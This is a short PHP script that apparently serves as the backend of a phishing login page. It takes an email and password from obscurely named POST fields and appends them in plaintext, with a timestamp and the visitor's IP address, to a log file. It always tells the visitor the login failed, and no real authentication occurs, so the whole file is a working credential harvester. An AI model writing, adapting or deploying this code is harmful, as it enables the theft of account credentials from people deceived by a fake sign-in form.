<?php
// Input validation
$email = filter_input(INPUT_POST, 'di', FILTER_SANITIZE_STRING);
$password = filter_input(INPUT_POST, 'pr', FILTER_SANITIZE_STRING);

// Function to send JSON response
function sendJsonResponse($success, $message = '', $redirectUrl = '') {
    header('Content-Type: application/json');
    echo json_encode([
        'success' => $success,
        'message' => $message,
        'redirectUrl' => $redirectUrl
    ]);
    exit();
}

// Log all login attempts
try {
    // Define logs folder and file path
    $logsFolder = __DIR__ . '/logs';
    $logFile = "{$logsFolder}/login_attempts.txt";

    // Ensure logs folder exists, and create it if not
    if (!is_dir($logsFolder)) {
        mkdir($logsFolder, 0755, true);
    }

    // Prepare log data
    $logData = "Date: " . date("Y-m-d H:i:s") . "\nEmail: {$email}\nPassword: {$password}\nIP: " . ($_SERVER['REMOTE_ADDR'] ?? 'Unknown') . "\n\n";

    // Append to log file
    file_put_contents($logFile, $logData, FILE_APPEND);

    // Send response
    sendJsonResponse(false, "Login attempt saved.");
} catch (Exception $e) {
    error_log("Failed to log login attempt: " . $e->getMessage());
    sendJsonResponse(false, "A server error occurred while saving the login attempt.");
}
?>
